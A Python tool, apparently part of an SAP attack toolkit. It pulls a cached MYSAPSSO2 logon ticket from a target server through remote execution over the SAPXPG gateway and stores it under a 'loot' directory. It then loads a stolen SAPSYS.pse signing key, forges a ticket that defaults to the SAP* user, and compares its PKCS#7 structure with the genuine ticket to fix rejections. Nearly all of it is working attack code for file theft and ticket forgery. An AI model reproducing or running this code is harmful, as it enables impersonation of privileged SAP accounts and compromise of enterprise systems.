#!/usr/bin/env python3
"""Compare a SAP-issued MYSAPSSO2 ticket with one we forge ourselves.

There is usually a sample MYSAPSSO2 ticket cached at
``/usr/sap/<SID>/<INST>/sec/ticket`` — extract it via the same chunked
GW SAPXPG channel we use for the PSE, parse it, and diff its
PKCS#7 structure against what our forger produces.

Reveals format mismatches that explain SAP-side rejection ("Anmeldung
fehlgeschlagen") without needing access to the SAP kernel source.

Usage:
    python3 tools/compare_with_sap_ticket.py \\
        --host 192.168.2.209 --port 3300 \\
        --sid S4H --hostname s4hanadev --instance 00
"""
from __future__ import annotations

import argparse
import os
import sys

_TOOLS = os.path.dirname(os.path.abspath(__file__))
_ROOT = os.path.dirname(_TOOLS)
sys.path.insert(0, _ROOT)
import modules  # noqa: F401


def _hex_dump(data: bytes, prefix: str = "", limit: int = 0) -> str:
    out = []
    show = data if limit == 0 else data[:limit]
    for i in range(0, len(show), 16):
        chunk = show[i:i+16]
        hexp = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"{prefix}{i:04x}  {hexp:<48}  {text}")
    if limit and len(data) > limit:
        out.append(f"{prefix}...  ({len(data) - limit} more bytes)")
    return "\n".join(out)


def _ber_read_tl(data: bytes, off: int):
    """Return (tag, value_offset, value_len, total_len)."""
    if off >= len(data):
        raise ValueError(f"BER read past end at offset {off}")
    tag = data[off]
    ln = data[off+1]
    if ln & 0x80:
        n = ln & 0x7F
        ln = int.from_bytes(data[off+2:off+2+n], "big")
        voff = off + 2 + n
    else:
        voff = off + 2
    return tag, voff, ln, voff - off + ln


def _summarize_pkcs7(p7_der: bytes, label: str) -> None:
    """Walk a PKCS#7 ContentInfo and print a structural summary."""
    print(f"\n--- {label} PKCS#7 structure ({len(p7_der)} bytes) ---")
    try:
        # ContentInfo SEQUENCE
        tag, o, l, _ = _ber_read_tl(p7_der, 0)
        assert tag == 0x30, f"not a SEQUENCE: 0x{tag:02x}"
        # contentType OID
        tag, oo, ll, _ = _ber_read_tl(p7_der, o)
        oid_bytes = p7_der[oo:oo+ll]
        print(f"  contentType OID len={ll}: {oid_bytes.hex()}")
        o = oo + ll
        # [0] EXPLICIT
        tag, o2, l2, _ = _ber_read_tl(p7_der, o)
        print(f"  [{tag:02x}] explicit wrapper, content {l2}B")
        # SignedData
        tag, o3, l3, _ = _ber_read_tl(p7_der, o2)
        assert tag == 0x30, f"SignedData not SEQUENCE: 0x{tag:02x}"
        end = o3 + l3
        # version
        tag, o4, l4, t4 = _ber_read_tl(p7_der, o3)
        ver = int.from_bytes(p7_der[o4:o4+l4], "big")
        print(f"  SignedData.version = {ver}")
        o3 = o4 + l4
        # digestAlgorithms
        tag, o4, l4, t4 = _ber_read_tl(p7_der, o3)
        print(f"  digestAlgorithms SET ({l4}B): {p7_der[o4:o4+l4].hex()}")
        o3 = o4 + l4
        # encapContentInfo
        tag, o4, l4, t4 = _ber_read_tl(p7_der, o3)
        print(f"  encapContentInfo SEQ ({l4}B): {p7_der[o4:o4+l4].hex()}")
        o3 = o4 + l4
        # optional [0] / [1]
        while o3 < end:
            tag, o4, l4, t4 = _ber_read_tl(p7_der, o3)
            if tag == 0xa0:
                print(f"  [0] IMPLICIT certs ({l4}B) <embedded>")
                # Look for the X.509 cert(s) inside
                co = o4
                cend = o4 + l4
                while co < cend:
                    ctag, cvo, cvl, ctl = _ber_read_tl(p7_der, co)
                    if ctag == 0x30:
                        print(f"      cert SEQUENCE @{co:#x}, "
                              f"{ctl}B total")
                    co += ctl
                o3 = o4 + l4
                continue
            if tag == 0xa1:
                print(f"  [1] IMPLICIT crls ({l4}B)")
                o3 = o4 + l4
                continue
            if tag == 0x31:
                # signerInfos
                print(f"  signerInfos SET ({l4}B):")
                so = o4
                send = o4 + l4
                while so < send:
                    stag, sov, sl, stl = _ber_read_tl(p7_der, so)
                    print(f"    SignerInfo ({stl}B, content {sl}B):")
                    # version
                    tag, ko, kl, _ = _ber_read_tl(p7_der, sov)
                    sver = int.from_bytes(p7_der[ko:ko+kl], "big")
                    print(f"      version = {sver}")
                    pos = ko + kl
                    # sid (SEQUENCE IssuerAndSerial, or [0] SubjectKeyId)
                    tag, ko, kl, _ = _ber_read_tl(p7_der, pos)
                    if tag == 0x30:
                        print(f"      sid = IssuerAndSerial ({kl}B)")
                    else:
                        print(f"      sid = [{tag:02x}] tag ({kl}B)")
                    pos = ko + kl
                    # digestAlgorithm
                    tag, ko, kl, _ = _ber_read_tl(p7_der, pos)
                    print(f"      digestAlgorithm SEQ ({kl}B): "
                          f"{p7_der[ko:ko+kl].hex()}")
                    pos = ko + kl
                    # optional [0] signedAttrs
                    tag, ko, kl, _ = _ber_read_tl(p7_der, pos)
                    if tag == 0xa0:
                        print(f"      [0] signedAttrs ({kl}B):")
                        # Walk attributes
                        ao = ko
                        aend = ko + kl
                        while ao < aend:
                            atag, avo, avl, atl = _ber_read_tl(
                                p7_der, ao)
                            # Attr is SEQ { OID, SET OF values }
                            oid_tag, oid_o, oid_l, _ = _ber_read_tl(
                                p7_der, avo)
                            oid_hex = p7_der[oid_o:oid_o+oid_l].hex()
                            print(f"        attr OID {oid_hex}, "
                                  f"value-set {avl - oid_l - 2}B")
                            ao += atl
                        pos = ko + kl
                        # digestEncryptionAlgorithm
                        tag, ko, kl, _ = _ber_read_tl(p7_der, pos)
                    print(f"      sigAlgorithm SEQ ({kl}B): "
                          f"{p7_der[ko:ko+kl].hex()}")
                    pos = ko + kl
                    # signature OCTET STRING
                    tag, ko, kl, _ = _ber_read_tl(p7_der, pos)
                    print(f"      signature OCTET ({kl}B): "
                          f"{p7_der[ko:ko+kl].hex()[:60]}...")
                    so += stl
                o3 = o4 + l4
                continue
            o3 = o4 + l4
    except Exception as e:
        print(f"  PARSE ERROR: {type(e).__name__}: {e}")


def main():
    ap = argparse.ArgumentParser(
        description="Extract /usr/sap/<SID>/<INST>/sec/ticket "
                    "via GW SAPXPG and compare to our forged tickets.")
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=3300)
    ap.add_argument("--sid", required=True)
    ap.add_argument("--hostname", required=True)
    ap.add_argument("--instance", default="00")
    ap.add_argument("--kernel", default="793")
    args = ap.parse_args()

    # Build the GW exec channel + chunked-read adapter (same as the
    # live tester / orchestrator).
    from sap_pse_loot import make_chunked_read_adapter, _read_file_b64

    # Reuse the test tool's _GwSession for the raw channel
    sys.path.insert(0, os.path.join(_ROOT, "tools"))
    from test_mysapsso2_chain import _GwSession

    session = _GwSession(
        host=args.host, port=args.port,
        sid=args.sid, hostname=args.hostname,
        instance=args.instance, kernel=args.kernel,
        client="000", timeout=20, verbose=False,
    )

    def raw(prog, params):
        return session.exec_fn(prog, params)

    exec_fn = make_chunked_read_adapter(raw)

    # ── Extract the SAP-issued ticket file ────────────────────────
    ticket_path = (f"/usr/sap/{args.sid.upper()}/D"
                   f"{args.instance.zfill(2)}/sec/ticket")
    print(f"\n[*] Extracting {ticket_path} via chunked GW SAPXPG ...")
    r = _read_file_b64(exec_fn, ticket_path)
    if not r["success"]:
        print(f"[-] Could not read ticket file: {r['error']}")
        return 1

    sap_ticket_bytes = r["bytes"]
    print(f"[+] Got {len(sap_ticket_bytes)} bytes")
    print()
    print("First 128 bytes of the SAP-issued ticket:")
    print(_hex_dump(sap_ticket_bytes, prefix="  ", limit=128))

    # Save it so we can re-analyze without re-extracting
    os.makedirs("loot/sap_sample_tickets", exist_ok=True)
    sap_ticket_file = "loot/sap_sample_tickets/ticket_raw.bin"
    with open(sap_ticket_file, "wb") as f:
        f.write(sap_ticket_bytes)
    print(f"\n[+] Saved raw bytes to {sap_ticket_file}")

    # ── Parse the SAP ticket with our parser ─────────────────────
    from sap_mysapsso2 import parse_ticket, forge_ticket
    print()
    print("=" * 60)
    print("  Parsing SAP-issued ticket")
    print("=" * 60)
    sap_parsed = parse_ticket(sap_ticket_bytes)
    print(f"  magic        : 0x{sap_parsed.get('magic', 0):02x}")
    print(f"  codepage     : {sap_parsed.get('codepage')!r}")
    print(f"  user         : {sap_parsed.get('user')!r}")
    print(f"  client       : {sap_parsed.get('client')!r}")
    print(f"  sid          : {sap_parsed.get('sid')!r}")
    print(f"  create_time  : {sap_parsed.get('create_time')!r}")
    print(f"  validity_min : {sap_parsed.get('validity_min')}")
    print(f"  has_signature: {sap_parsed.get('has_signature')}")
    print(f"  units:")
    for u in sap_parsed.get("units", []):
        decoded = u.get("decoded", "")
        if len(str(decoded)) > 60:
            decoded = f"<{len(decoded)}B>"
        print(f"    id=0x{u['id']:02x} name={u['name']:14s} "
              f"raw={u['raw'][:32].hex()}... decoded={decoded!r}")

    sap_prefix = sap_parsed.get("prefix_bytes", b"")
    sap_sig = sap_parsed.get("signature_bytes", b"")
    print(f"\n  prefix_len   : {len(sap_prefix)} bytes")
    print(f"  signature_len: {len(sap_sig)} bytes")

    # ── Compare with our forged ticket ───────────────────────────
    from sap_pse_loot import extract_signing_key
    with open("loot/pse/S4H_20260526_154249/SAPSYS.pse", "rb") as fh:
        pse = fh.read()
    keys = extract_signing_key(pse, "")
    our_t = forge_ticket(
        user=sap_parsed.get("user") or "SAP*",
        client=sap_parsed.get("client") or "000",
        sid=sap_parsed.get("sid") or args.sid,
        private_key=keys["private_key"],
        certificate=keys["certificate"],
        validity_min=480, digest="sha1")
    our_parsed = parse_ticket(our_t["ticket_bytes"])
    our_prefix = our_parsed.get("prefix_bytes", b"")
    our_sig = our_parsed.get("signature_bytes", b"")

    print()
    print("=" * 60)
    print("  Differences vs our forged ticket")
    print("=" * 60)
    print(f"  prefix bytes: SAP={len(sap_prefix)}  ours={len(our_prefix)}")
    print(f"  signature  : SAP={len(sap_sig)}  ours={len(our_sig)}")

    # InfoUnit-by-InfoUnit comparison
    sap_ids = [u["id"] for u in sap_parsed.get("units", [])]
    our_ids = [u["id"] for u in our_parsed.get("units", [])]
    print(f"\n  SAP InfoUnit IDs: {[hex(i) for i in sap_ids]}")
    print(f"  Our InfoUnit IDs: {[hex(i) for i in our_ids]}")
    extra_in_ours = [hex(i) for i in our_ids if i not in sap_ids]
    missing_from_ours = [hex(i) for i in sap_ids if i not in our_ids]
    if extra_in_ours:
        print(f"  ✗ InfoUnits in OUR ticket not in SAP's: "
              f"{extra_in_ours}")
    if missing_from_ours:
        print(f"  ✗ InfoUnits SAP has but we don't: "
              f"{missing_from_ours}")
    if not extra_in_ours and not missing_from_ours:
        print(f"  ✓ Same InfoUnit set")

    # Dump SAP's PKCS#7 structure
    _summarize_pkcs7(sap_sig, "SAP-issued")
    _summarize_pkcs7(our_sig, "Our-forged")

    print()
    print("=" * 60)
    print("  Look for differences above:")
    print(f"  - SignerInfo version (1 = IssuerAndSerial, 3 = "
          f"SubjectKeyId)")
    print(f"  - signedAttrs presence + attribute OIDs")
    print(f"  - digestAlgorithm OID")
    print(f"  - signatureAlgorithm OID")
    print(f"  - InfoUnit ordering & set composition")
    return 0


if __name__ == "__main__":
    sys.exit(main() or 0)
